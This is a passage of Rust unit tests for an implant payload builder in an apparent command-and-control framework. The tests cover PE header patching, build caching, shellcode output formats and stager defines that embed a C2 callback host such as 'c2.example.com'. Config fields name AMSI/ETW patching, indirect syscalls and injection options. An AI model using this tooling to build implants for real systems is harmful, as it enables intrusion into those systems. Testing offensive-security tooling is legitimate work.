        let mut bytes = vec![0_u8; 0x80 + 24 + 60];
        bytes[..2].copy_from_slice(b"MZ");
        bytes[0x3C..0x40].copy_from_slice(&(0x80_u32).to_le_bytes());
        bytes[0x80..0x84].copy_from_slice(b"NE\0\0"); // wrong signature
        let error = patch_payload(
            bytes,
            Architecture::X64,
            &BinaryConfig {
                header: Some(red_cell_common::config::HeaderConfig {
                    magic_mz_x64: None,
                    magic_mz_x86: None,
                    compile_time: Some("1".to_owned()),
                    image_size_x64: None,
                    image_size_x86: None,
                }),
                replace_strings_x64: std::collections::BTreeMap::new(),
                replace_strings_x86: std::collections::BTreeMap::new(),
            },
        )
        .expect_err("invalid PE signature should be rejected");

        assert!(matches!(error, PayloadBuildError::InvalidRequest { .. }));
    }

    fn sample_pe_payload() -> Vec<u8> {
        let mut bytes = vec![0_u8; 0x80 + 24 + 60];
        bytes[..2].copy_from_slice(b"MZ");
        bytes[0x3C..0x40].copy_from_slice(&(0x80_u32).to_le_bytes());
        bytes[0x80..0x84].copy_from_slice(b"PE\0\0");
        bytes
    }

    /// Build a minimal source tree and return (service, listener, request).
    ///
    /// `nasm_script` and `gcc_script` are the shell script bodies written to the
    /// respective stub executables. Both must be `#!/bin/sh` scripts.
    fn setup_build_fixture(
        temp: &TempDir,
        nasm_script: &str,
        gcc_script: &str,
    ) -> Result<
        (PayloadBuilderService, ListenerConfig, BuildPayloadRequestInfo),
        Box<dyn std::error::Error>,
    > {
        let bin_dir = temp.path().join("bin");
        let cache_dir = temp.path().join("payload-cache");
        let source_root = temp.path().join("src/Havoc/payloads/Demon");
        let shellcode_root = temp.path().join("src/Havoc/payloads");
        std::fs::create_dir_all(&bin_dir)?;
        std::fs::create_dir_all(source_root.join("src/core"))?;
        std::fs::create_dir_all(source_root.join("src/crypt"))?;
        std::fs::create_dir_all(source_root.join("src/inject"))?;
        std::fs::create_dir_all(source_root.join("src/asm"))?;
        std::fs::create_dir_all(source_root.join("src/main"))?;
        std::fs::create_dir_all(source_root.join("include"))?;
        std::fs::create_dir_all(&shellcode_root)?;
        std::fs::write(source_root.join("src/core/a.c"), "int x = 1;")?;
        std::fs::write(source_root.join("src/asm/test.x64.asm"), "bits 64")?;
        std::fs::write(source_root.join("src/main/MainExe.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainSvc.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainDll.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/Demon.c"), "int demo = 1;")?;
        std::fs::write(shellcode_root.join("Shellcode.x64.bin"), [0x90_u8, 0x90])?;
        std::fs::write(shellcode_root.join("Shellcode.x86.bin"), [0x90_u8, 0x90])?;
        std::fs::write(shellcode_root.join("DllLdr.x64.bin"), [0x55_u8, 0x48])?;
        let templates_dir = temp.path().join("payloads/templates");
        std::fs::create_dir_all(&templates_dir)?;
        std::fs::write(templates_dir.join("MainStager.c"), "int main(void){return 0;}")?;

        let nasm = bin_dir.join("nasm");
        let gcc = bin_dir.join("x86_64-w64-mingw32-gcc");
        std::fs::write(&nasm, nasm_script)?;
        std::fs::write(&gcc, gcc_script)?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&nasm, std::fs::Permissions::from_mode(0o755))?;
            std::fs::set_permissions(&gcc, std::fs::Permissions::from_mode(0o755))?;
        }

        let unknown_version =
            ToolchainVersion { major: 0, minor: 0, patch: 0, raw: "0.0.0".to_owned() };
        let service = PayloadBuilderService::with_paths_for_tests(
            Toolchain {
                compiler_x64: gcc.clone(),
                compiler_x64_version: unknown_version.clone(),
                compiler_x86: gcc,
                compiler_x86_version: unknown_version.clone(),
                nasm,
                nasm_version: unknown_version,
            },
            source_root,
            temp.path().join("agent/archon"),
            shellcode_root.join("Shellcode.x64.bin"),
            shellcode_root.join("Shellcode.x86.bin"),
            shellcode_root.join("DllLdr.x64.bin"),
            templates_dir.join("MainStager.c"),
            DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                allow_legacy_ctr: false,
            },
            None,
            cache_dir,
        );

        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Exe".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };

        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        }));

        Ok((service, listener, request))
    }

    #[tokio::test]
    async fn build_payload_compiler_exits_nonzero_returns_command_failed()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        // nasm succeeds and writes its output file; gcc always exits 1
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        let gcc_fail = "#!/bin/sh\necho 'stub compiler error' >&2\nexit 1\n";
        let (service, listener, request) = setup_build_fixture(&temp, nasm_ok, gcc_fail)?;

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("a compiler that exits non-zero must produce an error");

        assert!(
            matches!(error, PayloadBuildError::CommandFailed { .. }),
            "expected CommandFailed, got {error:?}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_assembler_exits_nonzero_returns_command_failed()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        // nasm always exits 1; gcc is never reached
        let nasm_fail = "#!/bin/sh\necho 'stub assembler error' >&2\nexit 1\n";
        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'payload' > \"$1\"; break; fi; shift; done\n";
        let (service, listener, request) = setup_build_fixture(&temp, nasm_fail, gcc_ok)?;

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("an assembler that exits non-zero must produce an error");

        assert!(
            matches!(error, PayloadBuildError::CommandFailed { .. }),
            "expected CommandFailed, got {error:?}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_compiler_failure_populates_diagnostics()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        // Emit a structured GCC diagnostic to stderr then exit 1.
        let gcc_fail =
            "#!/bin/sh\necho \"src/Demon.c:42:8: error: 'foo' undeclared\" >&2\nexit 1\n";
        let (service, listener, request) = setup_build_fixture(&temp, nasm_ok, gcc_fail)?;

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("compiler failure must yield an error");

        match error {
            PayloadBuildError::CommandFailed { ref diagnostics, .. } => {
                assert_eq!(diagnostics.len(), 1, "one GCC diagnostic should be parsed");
                let d = &diagnostics[0];
                assert_eq!(d.filename, "src/Demon.c");
                assert_eq!(d.line, 42);
                assert_eq!(d.column, Some(8));
                assert_eq!(d.severity, "error");
                assert!(d.message.contains("'foo' undeclared"));
            }
            other => panic!("expected CommandFailed, got {other:?}"),
        }
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_returns_cached_artifact_on_second_request()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        // The compiler writes "payload" the first time; we can detect a cache
        // hit if the artifact is returned without re-invoking the compiler.
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'payload' > \"$1\"; break; fi; shift; done\n";
        let (service, listener, request) = setup_build_fixture(&temp, nasm_ok, gcc_ok)?;

        // First build — cache miss, runs the compiler.
        let first = service.build_payload(&listener, &request, |_| {}).await?;
        assert_eq!(first.bytes, b"payload");

        // Second build with identical inputs — cache hit, no recompilation.
        let mut hit_messages = Vec::new();
        let second = service
            .build_payload(&listener, &request, |m| hit_messages.push(m.message.clone()))
            .await?;
        assert_eq!(second.bytes, b"payload");
        assert!(
            hit_messages.iter().any(|m| m.contains("cache hit")),
            "expected a cache-hit progress message, got: {hit_messages:?}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_cache_miss_on_different_architecture()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        // Different architectures use different compilers but the important
        // thing is that they must not share a cache entry.
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'payload' > \"$1\"; break; fi; shift; done\n";
        let (service, listener, request_x64) = setup_build_fixture(&temp, nasm_ok, gcc_ok)?;
        let request_x86 = BuildPayloadRequestInfo { arch: "x86".to_owned(), ..request_x64.clone() };

        let first = service.build_payload(&listener, &request_x64, |_| {}).await?;
        assert_eq!(first.bytes, b"payload");

        // x86 build should NOT return the x64 cached artifact.
        let mut hit_messages = Vec::new();
        service
            .build_payload(&listener, &request_x86, |m| hit_messages.push(m.message.clone()))
            .await
            .ok(); // may fail due to stub compiler, but we just need to check messages
        assert!(
            !hit_messages.iter().any(|m| m.contains("cache hit")),
            "x86 build should not hit the x64 cache entry, got: {hit_messages:?}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn payload_cache_flush_removes_all_entries() -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let cache_dir = temp.path().join("payload-cache");
        tokio::fs::create_dir_all(&cache_dir).await?;

        // Write a few fake entries.
        tokio::fs::write(cache_dir.join("aabbcc.exe"), b"artifact-1").await?;
        tokio::fs::write(cache_dir.join("ddeeff.dll"), b"artifact-2").await?;
        tokio::fs::write(cache_dir.join("112233.bin"), b"artifact-3").await?;

        let cache = PayloadCache::new(cache_dir.clone());
        let removed = cache.flush().await?;
        assert_eq!(removed, 3, "flush should remove all three entries");

        let mut dir = tokio::fs::read_dir(&cache_dir).await?;
        assert!(dir.next_entry().await?.is_none(), "cache directory should be empty after flush");
        Ok(())
    }

    #[tokio::test]
    async fn payload_cache_flush_returns_zero_for_nonexistent_dir()
    -> Result<(), Box<dyn std::error::Error>> {
        let cache = PayloadCache::new(PathBuf::from("/nonexistent/no/such/cache-dir"));
        let removed = cache.flush().await?;
        assert_eq!(removed, 0);
        Ok(())
    }

    #[test]
    fn compute_cache_key_differs_by_architecture() {
        let config_bytes = b"config";
        let key_x64 =
            compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, config_bytes, None)
                .unwrap();
        let key_x86 =
            compute_cache_key("demon", Architecture::X86, OutputFormat::Exe, config_bytes, None)
                .unwrap();
        assert_ne!(key_x64.hex, key_x86.hex, "x64 and x86 must produce different cache keys");
    }

    #[test]
    fn compute_cache_key_differs_by_format() {
        let config_bytes = b"config";
        let key_exe =
            compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, config_bytes, None)
                .unwrap();
        let key_dll =
            compute_cache_key("demon", Architecture::X64, OutputFormat::Dll, config_bytes, None)
                .unwrap();
        assert_ne!(key_exe.hex, key_dll.hex, "Exe and Dll must produce different cache keys");
    }

    #[test]
    fn compute_cache_key_differs_by_config_bytes() {
        let key_a =
            compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, b"config-a", None)
                .unwrap();
        let key_b =
            compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, b"config-b", None)
                .unwrap();
        assert_ne!(
            key_a.hex, key_b.hex,
            "different config bytes must produce different cache keys"
        );
    }

    #[test]
    fn compute_cache_key_ext_matches_format() {
        let key_exe =
            compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, b"c", None).unwrap();
        let key_bin =
            compute_cache_key("demon", Architecture::X64, OutputFormat::Shellcode, b"c", None)
                .unwrap();
        assert_eq!(key_exe.ext, ".exe");
        assert_eq!(key_bin.ext, ".bin");
    }

    #[test]
    fn compute_cache_key_deterministic() {
        let a = compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, b"same", None)
            .unwrap();
        let b = compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, b"same", None)
            .unwrap();
        assert_eq!(a.hex, b.hex, "identical inputs must produce the same cache key");
    }

    #[test]
    fn compute_cache_key_differs_by_binary_patch_presence() {
        let patch = BinaryConfig {
            header: None,
            replace_strings_x64: std::collections::BTreeMap::new(),
            replace_strings_x86: std::collections::BTreeMap::new(),
        };
        let key_none =
            compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, b"cfg", None).unwrap();
        let key_some =
            compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, b"cfg", Some(&patch))
                .unwrap();
        assert_ne!(
            key_none.hex, key_some.hex,
            "present vs absent binary_patch must produce different cache keys"
        );
    }

    #[test]
    fn compute_cache_key_differs_by_binary_patch_content() {
        let patch_a = BinaryConfig {
            header: None,
            replace_strings_x64: [("old".into(), "new-a".into())].into_iter().collect(),
            replace_strings_x86: std::collections::BTreeMap::new(),
        };
        let patch_b = BinaryConfig {
            header: None,
            replace_strings_x64: [("old".into(), "new-b".into())].into_iter().collect(),
            replace_strings_x86: std::collections::BTreeMap::new(),
        };
        let key_a = compute_cache_key(
            "demon",
            Architecture::X64,
            OutputFormat::Exe,
            b"cfg",
            Some(&patch_a),
        )
        .unwrap();
        let key_b = compute_cache_key(
            "demon",
            Architecture::X64,
            OutputFormat::Exe,
            b"cfg",
            Some(&patch_b),
        )
        .unwrap();
        assert_ne!(
            key_a.hex, key_b.hex,
            "different binary_patch content must produce different cache keys"
        );
    }

    #[test]
    fn compute_cache_key_differs_by_header_fields() {
        let patch_a = BinaryConfig {
            header: Some(HeaderConfig {
                magic_mz_x64: Some("MZ-A".into()),
                magic_mz_x86: None,
                compile_time: None,
                image_size_x64: None,
                image_size_x86: None,
            }),
            replace_strings_x64: std::collections::BTreeMap::new(),
            replace_strings_x86: std::collections::BTreeMap::new(),
        };
        let patch_b = BinaryConfig {
            header: Some(HeaderConfig {
                magic_mz_x64: Some("MZ-B".into()),
                magic_mz_x86: None,
                compile_time: None,
                image_size_x64: None,
                image_size_x86: None,
            }),
            replace_strings_x64: std::collections::BTreeMap::new(),
            replace_strings_x86: std::collections::BTreeMap::new(),
        };
        let key_a = compute_cache_key(
            "demon",
            Architecture::X64,
            OutputFormat::Exe,
            b"cfg",
            Some(&patch_a),
        )
        .unwrap();
        let key_b = compute_cache_key(
            "demon",
            Architecture::X64,
            OutputFormat::Exe,
            b"cfg",
            Some(&patch_b),
        )
        .unwrap();
        assert_ne!(
            key_a.hex, key_b.hex,
            "different header magic_mz_x64 must produce different cache keys"
        );
    }

    #[test]
    fn compute_cache_key_differs_by_header_compile_time() {
        let patch_a = BinaryConfig {
            header: Some(HeaderConfig {
                magic_mz_x64: None,
                magic_mz_x86: None,
                compile_time: Some("2024-01-01".into()),
                image_size_x64: None,
                image_size_x86: None,
            }),
            replace_strings_x64: std::collections::BTreeMap::new(),
            replace_strings_x86: std::collections::BTreeMap::new(),
        };
        let patch_b = BinaryConfig {
            header: Some(HeaderConfig {
                magic_mz_x64: None,
                magic_mz_x86: None,
                compile_time: Some("2025-06-15".into()),
                image_size_x64: None,
                image_size_x86: None,
            }),
            replace_strings_x64: std::collections::BTreeMap::new(),
            replace_strings_x86: std::collections::BTreeMap::new(),
        };
        let key_a = compute_cache_key(
            "demon",
            Architecture::X64,
            OutputFormat::Exe,
            b"cfg",
            Some(&patch_a),
        )
        .unwrap();
        let key_b = compute_cache_key(
            "demon",
            Architecture::X64,
            OutputFormat::Exe,
            b"cfg",
            Some(&patch_b),
        )
        .unwrap();
        assert_ne!(
            key_a.hex, key_b.hex,
            "different header compile_time must produce different cache keys"
        );
    }

    #[test]
    fn compute_cache_key_differs_by_header_image_size() {
        let patch_a = BinaryConfig {
            header: Some(HeaderConfig {
                magic_mz_x64: None,
                magic_mz_x86: None,
                compile_time: None,
                image_size_x64: Some(0x1000),
                image_size_x86: None,
            }),
            replace_strings_x64: std::collections::BTreeMap::new(),
            replace_strings_x86: std::collections::BTreeMap::new(),
        };
        let patch_b = BinaryConfig {
            header: Some(HeaderConfig {
                magic_mz_x64: None,
                magic_mz_x86: None,
                compile_time: None,
                image_size_x64: Some(0x2000),
                image_size_x86: None,
            }),
            replace_strings_x64: std::collections::BTreeMap::new(),
            replace_strings_x86: std::collections::BTreeMap::new(),
        };
        let key_a = compute_cache_key(
            "demon",
            Architecture::X64,
            OutputFormat::Exe,
            b"cfg",
            Some(&patch_a),
        )
        .unwrap();
        let key_b = compute_cache_key(
            "demon",
            Architecture::X64,
            OutputFormat::Exe,
            b"cfg",
            Some(&patch_b),
        )
        .unwrap();
        assert_ne!(
            key_a.hex, key_b.hex,
            "different header image_size_x64 must produce different cache keys"
        );
    }

    #[test]
    fn compute_cache_key_differs_by_replace_strings_x86() {
        let patch_a = BinaryConfig {
            header: None,
            replace_strings_x64: std::collections::BTreeMap::new(),
            replace_strings_x86: [("old".into(), "new-a".into())].into_iter().collect(),
        };
        let patch_b = BinaryConfig {
            header: None,
            replace_strings_x64: std::collections::BTreeMap::new(),
            replace_strings_x86: [("old".into(), "new-b".into())].into_iter().collect(),
        };
        let key_a = compute_cache_key(
            "demon",
            Architecture::X64,
            OutputFormat::Exe,
            b"cfg",
            Some(&patch_a),
        )
        .unwrap();
        let key_b = compute_cache_key(
            "demon",
            Architecture::X64,
            OutputFormat::Exe,
            b"cfg",
            Some(&patch_b),
        )
        .unwrap();
        assert_ne!(
            key_a.hex, key_b.hex,
            "different replace_strings_x86 must produce different cache keys"
        );
    }

    #[test]
    fn compute_cache_key_stable_for_identical_binary_patch() {
        let patch = BinaryConfig {
            header: Some(HeaderConfig {
                magic_mz_x64: Some("MZ".into()),
                magic_mz_x86: Some("MZ86".into()),
                compile_time: Some("2025-01-01".into()),
                image_size_x64: Some(0x1000),
                image_size_x86: Some(0x800),
            }),
            replace_strings_x64: [("a".into(), "b".into()), ("c".into(), "d".into())]
                .into_iter()
                .collect(),
            replace_strings_x86: [("e".into(), "f".into())].into_iter().collect(),
        };
        let key_1 =
            compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, b"cfg", Some(&patch))
                .unwrap();
        let key_2 =
            compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, b"cfg", Some(&patch))
                .unwrap();
        assert_eq!(
            key_1.hex, key_2.hex,
            "identical binary_patch configs must produce identical cache keys"
        );
    }

    #[test]
    fn compute_cache_key_all_dimensions_distinct() {
        use std::collections::HashSet;

        let patch = BinaryConfig {
            header: None,
            replace_strings_x64: std::collections::BTreeMap::new(),
            replace_strings_x86: std::collections::BTreeMap::new(),
        };
        let config = b"cfg";

        // Generate keys varying exactly one dimension at a time from a baseline.
        let keys: Vec<String> = vec![
            // baseline
            compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, config, None)
                .unwrap()
                .hex,
            // vary arch
            compute_cache_key("demon", Architecture::X86, OutputFormat::Exe, config, None)
                .unwrap()
                .hex,
            // vary format
            compute_cache_key("demon", Architecture::X64, OutputFormat::Dll, config, None)
                .unwrap()
                .hex,
            compute_cache_key("demon", Architecture::X64, OutputFormat::ServiceExe, config, None)
                .unwrap()
                .hex,
            compute_cache_key(
                "demon",
                Architecture::X64,
                OutputFormat::ReflectiveDll,
                config,
                None,
            )
            .unwrap()
            .hex,
            compute_cache_key("demon", Architecture::X64, OutputFormat::Shellcode, config, None)
                .unwrap()
                .hex,
            compute_cache_key(
                "demon",
                Architecture::X64,
                OutputFormat::StagedShellcode,
                config,
                None,
            )
            .unwrap()
            .hex,
            compute_cache_key("demon", Architecture::X64, OutputFormat::RawShellcode, config, None)
                .unwrap()
                .hex,
            // vary config bytes
            compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, b"other", None)
                .unwrap()
                .hex,
            // vary binary_patch
            compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, config, Some(&patch))
                .unwrap()
                .hex,
        ];

        let unique: HashSet<&str> = keys.iter().map(|s| s.as_str()).collect();
        assert_eq!(
            unique.len(),
            keys.len(),
            "all cache keys must be distinct; got {} unique out of {}",
            unique.len(),
            keys.len()
        );
    }

    #[test]
    fn compute_cache_key_differs_by_agent_name() {
        let config_bytes = b"config";
        let key_demon =
            compute_cache_key("demon", Architecture::X64, OutputFormat::Exe, config_bytes, None)
                .unwrap();
        let key_archon =
            compute_cache_key("archon", Architecture::X64, OutputFormat::Exe, config_bytes, None)
                .unwrap();
        assert_ne!(
            key_demon.hex, key_archon.hex,
            "demon and archon must produce different cache keys for identical other inputs"
        );
    }

    /// Regression test: Demon and Archon builds with identical listener/config/arch/format
    /// must not share a cache entry.  Before the fix, `compute_cache_key` omitted the agent
    /// variant from the hash, so the second build would return the first build's bytes.
    #[tokio::test]
    async fn build_payload_demon_and_archon_do_not_share_cache()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        // Compiler writes "demon-bytes" when building Demon and "archon-bytes" when building
        // Archon.  We detect a collision if the Archon request returns "demon-bytes".
        let gcc_demon = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'demon-bytes' > \"$1\"; break; fi; shift; done\n";

        let (service, listener, demon_request) = setup_build_fixture(&temp, nasm_ok, gcc_demon)?;

        // First build: Demon — cache miss, compiler writes "demon-bytes".
        let demon_artifact = service.build_payload(&listener, &demon_request, |_| {}).await?;
        assert_eq!(demon_artifact.bytes, b"demon-bytes");

        // Create a minimal Archon source tree so the existence check passes.
        let archon_root = temp.path().join("agent/archon");
        for dir in ["src/core", "src/crypt", "src/inject", "src/asm", "src/main", "include"] {
            std::fs::create_dir_all(archon_root.join(dir))?;
        }
        std::fs::write(archon_root.join("src/core/a.c"), "int x = 1;")?;
        std::fs::write(archon_root.join("src/asm/test.x64.asm"), "bits 64")?;
        std::fs::write(archon_root.join("src/main/MainExe.c"), "int main(void){return 0;}")?;
        std::fs::write(archon_root.join("src/main/MainSvc.c"), "int main(void){return 0;}")?;
        std::fs::write(archon_root.join("src/main/MainDll.c"), "int main(void){return 0;}")?;
        std::fs::write(archon_root.join("src/Demon.c"), "int demo = 1;")?;

        let archon_request =
            BuildPayloadRequestInfo { agent_type: "Archon".to_owned(), ..demon_request.clone() };

        // Second build: Archon with identical listener/config/arch/format.
        // The cache key must differ from Demon's, so we get a cache miss (full build).
        let mut hit_messages = Vec::new();
        // The build may succeed or fail depending on stub output — we only care about
        // whether a cache hit was reported.
        let _ = service
            .build_payload(&listener, &archon_request, |m| hit_messages.push(m.message.clone()))
            .await;

        assert!(
            !hit_messages.iter().any(|m| m.contains("cache hit")),
            "Archon build must not hit the Demon cache entry; messages: {hit_messages:?}"
        );
        Ok(())
    }

    // ──────────────────────────────────────────────────────────────────────
    // OutputFormat: new variants
    // ──────────────────────────────────────────────────────────────────────

    #[test]
    fn output_format_parses_staged_shellcode() {
        let fmt = OutputFormat::parse("Windows Shellcode Staged")
            .expect("should parse Windows Shellcode Staged");
        assert_eq!(fmt, OutputFormat::StagedShellcode);
        assert_eq!(fmt.file_extension(), ".exe");
    }

    #[test]
    fn output_format_parses_raw_shellcode() {
        let fmt = OutputFormat::parse("Windows Raw Shellcode")
            .expect("should parse Windows Raw Shellcode");
        assert_eq!(fmt, OutputFormat::RawShellcode);
        assert_eq!(fmt.file_extension(), ".bin");
    }

    #[test]
    fn output_format_parse_rejects_unknown_format() {
        let err = OutputFormat::parse("Windows Invalid Format")
            .expect_err("unknown format should be rejected");
        assert!(
            matches!(&err, PayloadBuildError::InvalidRequest { message }
                if message.contains("Windows Invalid Format")),
            "unexpected error: {err}"
        );
    }

    // ──────────────────────────────────────────────────────────────────────
    // build_stager_defines
    // ──────────────────────────────────────────────────────────────────────

    #[test]
    fn build_stager_defines_embeds_host_port_uri_and_secure_flag()
    -> Result<(), Box<dyn std::error::Error>> {
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["c2.example.com".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 80,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: vec!["/stage1".to_owned()],
            host_header: None,
            secure: true,
            cert: None,
            response: None,
            proxy: None,
        }));

        let defines = build_stager_defines(&listener)?;

        // Every define must pass the injection-safety validator.
        for d in &defines {
            validate_define(d)?;
        }
        // STAGER_PORT uses port_conn (443) not port_bind (80).
        assert!(defines.iter().any(|d| d == "STAGER_PORT=443"), "port define missing: {defines:?}");
        // STAGER_SECURE=1 because secure=true.
        assert!(defines.iter().any(|d| d == "STAGER_SECURE=1"), "secure flag missing: {defines:?}");
        // Host bytes for "c2.example.com" must appear in the STAGER_HOST define.
        let host_define = defines
            .iter()
            .find(|d| d.starts_with("STAGER_HOST="))
            .expect("STAGER_HOST define missing");
        // "c2" starts with 0x63, 0x32 — spot-check first two bytes.
        assert!(host_define.contains("0x63"), "host bytes missing '0x63' (c): {host_define}");
        assert!(host_define.contains("0x32"), "host bytes missing '0x32' (2): {host_define}");
        Ok(())
    }

    #[test]
    fn build_stager_defines_uses_port_bind_when_port_conn_is_none()
    -> Result<(), Box<dyn std::error::Error>> {
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["host.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 8080,
            port_conn: None,
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        }));

        let defines = build_stager_defines(&listener)?;
        assert!(defines.iter().any(|d| d == "STAGER_PORT=8080"), "should fall back to port_bind");
        Ok(())
    }

    #[test]
    fn build_stager_defines_uses_default_uri_when_uris_empty()
    -> Result<(), Box<dyn std::error::Error>> {
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["host.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 80,
            port_conn: None,
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(), // empty — should default to "/"
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        }));

        let defines = build_stager_defines(&listener)?;
        // "/" is 0x2f.
        let uri_define = defines
            .iter()
            .find(|d| d.starts_with("STAGER_URI="))
            .expect("STAGER_URI define missing");
        assert!(uri_define.contains("0x2f"), "default '/' URI bytes missing: {uri_define}");
        Ok(())
    }

    #[test]
    fn build_stager_defines_rejects_non_http_listener() {
        let listener = ListenerConfig::Smb(red_cell_common::SmbListenerConfig {
            name: "smb".to_owned(),
            pipe_name: "pivot".to_owned(),
            kill_date: None,
            working_hours: None,
        });
        let err = build_stager_defines(&listener)
            .expect_err("non-HTTP listener should be rejected for stager");
        assert!(
            matches!(&err, PayloadBuildError::InvalidRequest { message }
                if message.contains("HTTP listener")),
            "unexpected error: {err}"
        );
    }

    // ──────────────────────────────────────────────────────────────────────
    // build_payload: new formats (integration with fake toolchain)
    // ──────────────────────────────────────────────────────────────────────

    #[tokio::test]
    async fn build_payload_raw_shellcode_rejects_x86() -> Result<(), Box<dyn std::error::Error>> {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x86".to_owned(),
            format: "Windows Raw Shellcode".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        }));

